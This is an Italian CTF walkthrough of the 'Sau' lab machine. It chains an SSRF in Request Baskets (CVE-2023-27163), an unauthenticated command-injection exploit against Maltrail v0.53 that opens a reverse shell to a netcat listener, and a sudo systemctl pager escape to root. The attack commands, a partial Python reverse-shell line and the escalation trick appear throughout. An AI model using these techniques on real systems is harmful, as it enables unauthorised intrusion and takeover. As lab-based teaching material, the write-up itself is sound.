---
title: "Sau Walkthrough"
description: "Sau è una macchina Linux a difficoltà facile che presenta un’istanza di Request Baskets vulnerabile a Server-Side Request Forgery (SSRF) tramite CVE-2023-27163. Sfruttando questa vulnerabilità otteniamo accesso a una istanza Maltrail vulnerabile a OS Command Injection non autenticato, che ci permette di ottenere una reverse shell sulla macchina come utente puma. Una errata configurazione di sudo viene poi sfruttata per ottenere una shell root."
author: dua2z3rr
date: 2025-09-02 1:00:00
categories: [Walkthrough]
tags: ["Area di Interesse: Injections", "Area di Interesse: Web Application", "Vulnerabilità: OS Command Injection", "Vulnerabilità: Server Side Request Forgery (SSRF)", "Codice: Bash"]
image: /assets/img/sau/sau-resized.png"
---

## Enumerazione Esterna

### Nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.224 -vv -p-
<SNIP>
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.224 -vv -p 22,80,8338,55555 -sC -sV
<SNIP>
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 02 Sep 2025 09:50:20 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Tue, 02 Sep 2025 09:49:53 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Tue, 02 Sep 2025 09:49:53 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=9/2%Time=68B6BDC0%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html
SF:;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Tue,\x2002\x20Sep\x
SF:202025\x2009:49:53\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"
SF:/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2
SF:0200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Tue,\x2002\x20Sep\x
SF:202025\x2009:49:53\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nDate:\x20Tue,\x2002\x20Sep\x202025\x2009:50:20\x20GMT
SF:\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20n
SF:ame\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\
SF:$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La porta 8338, nella maggior parte dei contesti, è usata da applicazioni di streaming video—spesso servizi come "MulticastTV" o software privati di trasmissione dati multimediali. Non è una porta standard ufficiale IANA, ma viene sfruttata soprattutto per comunicazioni personalizzate tra server e client, solitamente in reti locali o su applicativi specifici. Per la porta 55555 non abbiamo troppe informazioni.

### HTTP

Andando sulla porta 80, nulla viene caricato. Andando invece sulla porta 55555, viene caricato un sito http.

![Desktop View](/assets/img/sau/sau-home-page.png)

Il sito si chiama `Request Baskets` ed è `powered by request-baskets` versione `1.2.1`.

Notiamo che possiamo creare dei basket per collezionare e ispezionare richieste http. Proviamo a crearne uno con il valore già inserito di default.

![Desktop View](/assets/img/sau/sau-token.png)

Viene creato un token. Che si tratti di Server-Side Request Forgery?

Cliccando su `open basket` veniamo reindirizzati a questa schermata.

![Desktop View](/assets/img/sau/sau-open-basket-page.png)

Guardiamo il path della directory in cui ci troviamo e vediamo che è stata creata per il nostro basket.

![Desktop View](/assets/img/sau/sau-directory-basket.png)

Attraverso il fuzzing delle direcotry del sito, potremmo ottenere accesso a basket di altre persone, e dentro di qei basket trovare http request dove potremmo ottenere  altre informazioni importanti.

### Ricerca Exploit

Ricerchiamo esistenti exploit riguardanti la versione 1.2.1 di request-baskets.

![Desktop View](/assets/img/sau/sau-exploit-SSRF.png)

CVE-2023-27163 fa al caso nostro. Cerchiamo una POC (Proof-Of-Concept) online.

> request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.

### Exploit

Utilizziamo l'exploit.

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/sau]
└──╼ $python3 exploit.py http://10.10.11.224:55555 http://127.0.0.1:80
Exploit for SSRF vulnerability on Request-Baskets (1.2.1) (CVE-2023-27163).
Exploit successfully executed.
Any request sent to http://10.10.11.224:55555/fpjaij will now be forwarded to the service on http://127.0.0.1:80.
```

## Porta 80

### Enumerazione

Ora accediamo a `http://10.10.11.224:55555/fpjaij`

![Desktop View](/assets/img/sau/sau-maltrail.png)

Vediamo immediatamente in basso a sinistra la scritta `Powered by Maltrail V0.53`.

### Cosa è maltrail?

> Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name (e.g. zvpprsensinaix.com for Banjori malware), URL (e.g. hXXp://109.162.38.120/harsh02.exe for known malicious executable), IP address (e.g. 185.130.5.231 for known attacker) or HTTP User-Agent header value (e.g. sqlmap for automatic SQL injection and database takeover tool). Also, it uses (optional) advanced heuristic mechanisms that can help in discovery of unknown threats (e.g. new malware).

### Ricerca Exploit

Nulla sulla pagina iniziale aiuta a scoprire infomazioni importanti. Passiamo allora alla ricerca dell'exploit.

![Desktop View](/assets/img/sau/sau-maltrail-exploit.png)

PERFETTO!

### Exploit

Avviamo l'exploit trovato su <https://exploit.company/exploits/maltrail-v0-53-unauthenticated-remote-code-execution-rce/>

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/sau]
└──╼ $python3 maltrail-exploit.py 10.10.16.9 9001 http://10.10.11.224:55555/fpjaij
Running exploit on http://10.10.11.224:55555/fpjaij/login
```

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.224 47460
$ whoami
whoami
puma
```

## Shell come puma

### Enumrazione Interna

Sempre come primo comando dopo whoami e aver preso la user flag, uso `sudo -l` e vedo che possiamo eseguire un binary come **root**.

```shell
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Sappiamo su cosa lavorare.

### Ricerca Exploit

Cominciamo enumerando la versione di `systemctl`.

```shell
$ systemctl --version
systemctl --version
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```

Esiste la vulnerabilità CVE-2023-26604, visibile sul sito <https://cvefeed.io/vuln/detail/CVE-2023-26604>.

```shell
$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Tue 2025-09-02 09:25:28 UTC; 2h 9min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 896 (python3)
      Tasks: 10 (limit: 4662)
     Memory: 23.5M
     CGroup: /system.slice/trail.service
             ├─ 896 /usr/bin/python3 server.py
             ├─1176 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed p>
             ├─1179 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed p>
             ├─1184 sh
             ├─1187 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1188 /bin/sh
             ├─1203 sudo /usr/bin/systemctl status trail.service
             ├─1205 /usr/bin/systemctl status trail.service
             └─1206 pager

Sep 02 09:25:28 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
Sep 02 11:24:51 sau sudo[1193]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=ro>
Sep 02 11:34:31 sau sudo[1203]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=ro>
Sep 02 11:34:31 sau sudo[1203]: pam_unix(sudo:session): session opened for user>
lines 1-23
lines 1-23/23 (END)
lines 1-23/23 (END)!sh
!sshh!sh
#
```

Scrivendo `!sh` alla fine del terminale riusciamo a diventare root. Terminiamo la box prendendo la root flag.
